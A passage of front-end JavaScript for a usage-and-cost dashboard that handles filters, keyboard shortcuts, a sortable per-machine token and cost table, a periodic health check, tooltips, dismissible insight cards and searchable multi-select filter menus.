            const btn = event.target.closest('[data-remove-filter-key]');
            if (!btn) return;
            const key = btn.dataset.removeFilterKey;
            const val = btn.dataset.removeFilterVal;
            const next = new URLSearchParams(location.search);
            const kept = next.getAll(key).filter(v => v !== val);
            next.delete(key);
            kept.forEach(v => next.append(key, v));
            const qs = next.toString();
            dashdGo(qs ? '/?' + qs : '/?range=all');
        });
    }

    // Quick date presets
    const dateFromEl = document.getElementById('date_from');
    const dateToEl = document.getElementById('date_to');
    const filterForm = document.getElementById('filter-form');
    if (document.querySelectorAll) {
        const rangeEl = document.getElementById('filter-range');
        document.querySelectorAll('[data-date-preset]').forEach(btn => {
            const p = btn.dataset.datePreset;
            btn.addEventListener('click', () => {
                if (!dateFromEl || !dateToEl || !filterForm || !rangeEl) return;
                dateFromEl.value = '';
                dateToEl.value = '';
                rangeEl.value = p;
                // Remembered for the next bare visit.
                document.cookie = 'dashd_range=' + p + ';path=/;max-age=31536000;SameSite=Lax';
                if (filterForm.requestSubmit) filterForm.requestSubmit(); else filterForm.submit();
            });
        });
    }

    // Keyboard shortcuts: '/' focuses session search, 'r' refreshes, 'Esc' closes filter drawer
    if (document.addEventListener) {
        document.addEventListener('keydown', event => {
            const tag = (event.target && event.target.tagName || '').toLowerCase();
            if (tag === 'input' || tag === 'textarea' || tag === 'select') {
                if (event.key === 'Escape' && event.target.blur) event.target.blur();
                return;
            }
            if (event.metaKey || event.ctrlKey || event.altKey) return;
            if (event.key === '/') {
                event.preventDefault();
                setActiveView('sessions');
                const search = document.getElementById('sessions-search');
                if (search && search.focus) search.focus();
            } else if (event.key === 'r') {
                location.reload();
            } else if (['1', '2', '3', '4', '5'].includes(event.key)) {
                setActiveView(['overview', 'insights', 'sessions', 'breakdown', 'system'][Number(event.key) - 1]);
            } else if (event.key === 'f' && filterToggle && filterToggle.click) {
                filterToggle.click();
            } else if (event.key === 't' && themeBtn && themeBtn.click) {
                themeBtn.click();
            } else if (event.key === '?' && typeof window !== 'undefined' && typeof window.showDashdShortcuts === 'function') {
                window.showDashdShortcuts();
            } else if (event.key === 'Escape' && filterPanel && !filterPanel.classList.contains('is-collapsed')) {
                filterPanel.classList.add('is-collapsed');
                if (filterToggle) filterToggle.setAttribute('aria-expanded', 'false');
            }
        });
    }

    // Machines breakdown table
    const machines = (dashboardData.machines || []).slice();
    const machineSort = { field: 'cost', asc: false };
    function renderMachines() {
        const tbody = document.getElementById('machines-tbody');
        if (!tbody) return;
        const sorted = sortData(machines, machineSort);
        if (!sorted.length) {
            tbody.innerHTML = emptyRow(10, 'No machine calls in this view.');
            return;
        }
        tbody.innerHTML = sorted.map(m => `
            <tr>
                <td><a class="badge" href="${filterLink('machine', m.name)}" title="Filter to this machine">${escapeHtml(m.name)}</a></td>
                <td class="numeric" title="${formatFullNumber(m.sessions)}">${formatCompactNumber(m.sessions)}</td>
                <td class="numeric" title="${formatFullNumber(m.messages)}">${formatCompactNumber(m.messages)}</td>
                <td class="numeric tokens" title="${escapeHtml(tokenTitle(m))}">${formatCompactNumber(m.tokens)}</td>
                <td class="numeric tokens" title="${formatFullNumber(m.input_tokens)}">${formatCompactNumber(m.input_tokens)}</td>
                <td class="numeric tokens" title="${formatFullNumber(m.output_tokens)}">${formatCompactNumber(m.output_tokens)}</td>
                <td class="numeric tokens" title="${formatFullNumber(m.cache_read_tokens)}">${formatCompactNumber(m.cache_read_tokens)}</td>
                <td class="numeric cost">${formatMoney(Number(m.cost || 0))}</td>
                <td class="numeric">${formatMoney(Number(m.per_session || 0))}</td>
                <td class="numeric">
                    <div class="bar-container bar-inline">
                        <div class="bar" style="width: ${Number(m.pct || 0)}%"></div>
                    </div>
                    ${Number(m.pct || 0).toFixed(1)}%
                </td>
            </tr>
        `).join('');
    }
    if (document.getElementById('machines-tbody')) {
        setupSorting('machines-table', machineSort, renderMachines);
        renderMachines();
        dashdRefreshers.push(() => {
            refillArray(machines, dashboardData.machines);
            renderMachines();
        });
    }

    // Subtle /healthz check every 60s while visible to flag new data on Refresh
    let initialCalls = null; // the first answer, whatever the filter shows
    const reloadBtn = document.querySelector ? document.querySelector('.topbar [data-reload]') : null;
    if (reloadBtn && typeof fetch === 'function' && typeof setInterval === 'function') {
        setInterval(() => {
            if (document.visibilityState && document.visibilityState !== 'visible') return;
            fetch('/healthz', { cache: 'no-store' })
                .then(r => r.ok ? r.json() : null)
                .then(h => {
                    if (!h || typeof h.calls !== 'number') return;
                    if (initialCalls === null) initialCalls = h.calls;
                    if (h.calls > initialCalls) {
                        reloadBtn.textContent = 'Refresh (new data)';
                        reloadBtn.classList.add('has-new-data');
                    }
                })
                .catch(() => {});
        }, 60000);
    }

    // Compact table columns toggle (defaults to on for narrow mobile viewports)
    const compactBtn = document.getElementById('compact-tables-toggle');
    function setCompactTables(on) {
        if (document.body && document.body.classList) {
            document.body.classList.toggle('compact-tables', on);
        }
        if (compactBtn) {
            compactBtn.classList.toggle('is-active', on);
            compactBtn.setAttribute('aria-pressed', on ? 'true' : 'false');
        }
    }
    let compactOn = false;
    try {
        const storedCompact = localStorage.getItem('dashd:compact');
        if (storedCompact !== null) {
            compactOn = storedCompact === '1';
        } else if (typeof window !== 'undefined' && window.innerWidth > 0 && window.innerWidth <= 640) {
            compactOn = true;
        }
    } catch (_) {}
    setCompactTables(compactOn);
    if (compactBtn && compactBtn.addEventListener) {
        compactBtn.addEventListener('click', () => {
            compactOn = !compactOn;
            try { localStorage.setItem('dashd:compact', compactOn ? '1' : '0'); } catch (_) {}
            setCompactTables(compactOn);
        });
    }

    // Touch- and hover-friendly chart tooltip for Daily Spending & Activity bars
    const tipEl = document.getElementById('chart-tooltip');
    if (tipEl && document.addEventListener) {
        const showTip = (target, clientX, clientY) => {
            const text = target && target.getAttribute ? target.getAttribute('title') : '';
            if (!text) return;
            tipEl.textContent = text;
            tipEl.hidden = false;
            const vw = (typeof window !== 'undefined' && window.innerWidth) || 375;
            const x = Math.min(Math.max(10, clientX + 12), vw - 270);
            const y = Math.max(10, clientY - 38);
            tipEl.style.left = x + 'px';
            tipEl.style.top = y + 'px';
        };
        const hideTip = () => { tipEl.hidden = true; };

        ['daily-chart-content', 'activity-chart'].forEach(id => {
            const host = document.getElementById(id);
            if (!host || !host.addEventListener) return;
            host.addEventListener('mouseover', e => {
                const bar = e.target.closest('.bar-segment, .activity-bar, .activity-col');
                if (bar) showTip(bar, e.clientX || 20, e.clientY || 80);
            });
            host.addEventListener('mousemove', e => {
                if (tipEl.hidden) return;
                const bar = e.target.closest('.bar-segment, .activity-bar, .activity-col');
                if (bar) showTip(bar, e.clientX || 20, e.clientY || 80);
            });
            host.addEventListener('mouseout', hideTip);
            host.addEventListener('pointerdown', e => {
                const bar = e.target.closest('.bar-segment, .activity-bar, .activity-col');
                if (bar) showTip(bar, e.clientX || 20, e.clientY || 80);
                else hideTip();
            });
        });
    }

    // Dismissible info/tip insight cards (persisted in localStorage)
    let dismissedInsights = [];
    try {
        dismissedInsights = JSON.parse(localStorage.getItem('dashd:dismissed-insights') || '[]') || [];
    } catch (_) {}
    // Warnings come back: they are snoozed for a week, never dismissed for good.
    let snoozed = {};
    try { snoozed = JSON.parse(localStorage.getItem('dashd:snoozed-insights') || '{}') || {}; } catch (_) {}
    function hideInsights() {
        if (!document.querySelectorAll) return;
        document.querySelectorAll('[data-insight-id]').forEach(card => {
            const id = card.dataset.insightId;
            if (dismissedInsights.indexOf(id) !== -1 || Number(snoozed[id]) > Date.now()) {
                card.classList.add('is-hidden');
            }
        });
    }
    hideInsights();
    window.dashdHideInsights = hideInsights;
    if (document.addEventListener) {
        document.addEventListener('click', event => {
            const snooze = event.target.closest('[data-snooze-insight]');
            if (snooze) {
                snoozed[snooze.dataset.snoozeInsight] = Date.now() + 7 * 86400e3;
                try { localStorage.setItem('dashd:snoozed-insights', JSON.stringify(snoozed)); } catch (_) {}
                hideInsights();
                if (typeof window.showDashdToast === 'function') window.showDashdToast('Snoozed for 7 days');
                return;
            }
            const btn = event.target.closest('[data-dismiss-insight]');
            if (!btn) return;
            const id = btn.dataset.dismissInsight;
            if (id && dismissedInsights.indexOf(id) === -1) {
                dismissedInsights.push(id);
                try { localStorage.setItem('dashd:dismissed-insights', JSON.stringify(dismissedInsights)); } catch (_) {}
            }
            if (document.querySelectorAll) {
                document.querySelectorAll('[data-insight-id]').forEach(card => {
                    if (card.dataset.insightId === id) card.classList.add('is-hidden');
                });
            }
        });
    }

    // Enhance multi-select filter <select> elements with searchable checkbox popovers
    if (typeof document.createElement === 'function') {
        ['model', 'agent', 'project', 'machine', 'tag'].forEach(id => {
            const sel = document.getElementById(id);
            if (!sel || !sel.options || !sel.parentNode || !sel.parentNode.insertBefore) return;
            const opts = Array.from(sel.options);
            if (!opts.length) return;

            sel.classList.add('sr-only-select');
            const details = document.createElement('details');
            details.className = 'multi-picker';

            const summary = document.createElement('summary');
            const updateSummary = () => {
                const count = opts.filter(o => o.selected).length;
                summary.textContent = count > 0 ? count + ' selected' : 'Any (' + opts.length + ')';
            };
            updateSummary();
            details.appendChild(summary);
            dashdRefreshers.push(() => {
                details.removeAttribute('open');
                list.querySelectorAll('input').forEach((cb, i) => { cb.checked = !!opts[i].selected; });
                updateSummary();
            });

            const menu = document.createElement('div');
            menu.className = 'multi-picker-menu';
            const search = document.createElement('input');
            search.type = 'search';
            search.className = 'multi-picker-search';
            search.placeholder = 'Search...';
            menu.appendChild(search);

            const list = document.createElement('div');
            list.className = 'multi-picker-list';
            const rows = opts.map(opt => {
                const label = document.createElement('label');
                label.className = 'multi-picker-item';
                const cb = document.createElement('input');
                cb.type = 'checkbox';
                cb.checked = !!opt.selected;
                cb.addEventListener('change', () => {
                    opt.selected = cb.checked;
                    updateSummary();
                });
                const span = document.createElement('span');
                span.textContent = opt.textContent || opt.value;
                label.appendChild(cb);
                label.appendChild(span);
                list.appendChild(label);
                return { label, text: String(opt.value || '').toLowerCase() };
            });

            search.addEventListener('input', () => {
                const q = search.value.trim().toLowerCase();
                rows.forEach(r => {
                    r.label.style.display = (!q || r.text.includes(q)) ? '' : 'none';
                });
            });

            menu.appendChild(list);
            details.appendChild(menu);
            sel.parentNode.insertBefore(details, sel.nextSibling);
        });
    }
})();
